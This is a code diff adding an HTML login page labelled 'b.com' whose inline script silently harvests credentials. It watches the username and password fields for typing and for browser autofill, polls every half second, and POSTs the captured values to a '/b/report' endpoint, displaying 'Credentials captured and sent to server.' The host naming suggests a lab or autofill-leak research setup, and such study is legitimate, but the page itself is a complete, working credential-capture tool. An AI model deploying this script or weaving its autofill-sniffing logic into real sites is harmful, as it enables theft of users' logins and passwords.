@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+    <h1>b.com</h1>
+    <form>
+        <label for="example_user">Username:</label>
+        <input type="text" id="b_user" name="b_username">
+        <br><br>
+
+        <label for="example_pass">Password:</label>
+        <input type="password" id="b_pass" name="b_password">
+        <br><br>
+    </form>
+
+    <script>
+            document.addEventListener("DOMContentLoaded", function() {
+                // 1. Parse URL Parameters directly from the browser address bar
+
+                const host = window.location.hostname;
+
+                const userField = document.getElementById('b_user');
+                const passField = document.getElementById('b_pass');
+                let dataSent = false;
+
+                function sendReport() {
+                    if (dataSent || (!userField.value && !passField.value)) return;
+
+                    const payload = {
+                        username: userField.value,
+                        password: passField.value
+                    };
+
+                    fetch('/b/report', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        const statusDiv = document.getElementById('status');
+                        if(statusDiv) statusDiv.innerText = "Credentials captured and sent to server.";
+                        console.log("Report sent successfully");
+                        // dataSent = true; // Uncomment to send only once
+                    })
+                    .catch((error) => console.error('Error:', error));
+                }
+
+                // Monitor for Autofill
+                userField.addEventListener('change', sendReport);
+                passField.addEventListener('change', sendReport);
+                userField.addEventListener('input', sendReport);
+                passField.addEventListener('input', sendReport);
+
+                let sent = false;
+
+                setInterval(() => {
+                    // Check if fields have data AND we haven't sent it yet
+                    if ((userField.value || passField.value) && !sent) {
+                        sent = true;   // Mark as sent immediately to prevent double sending
+                        sendReport();  // Actually send the report
+                    }
+                }, 500);
+            });
+        </script>
+</body>
+
+
+</html>
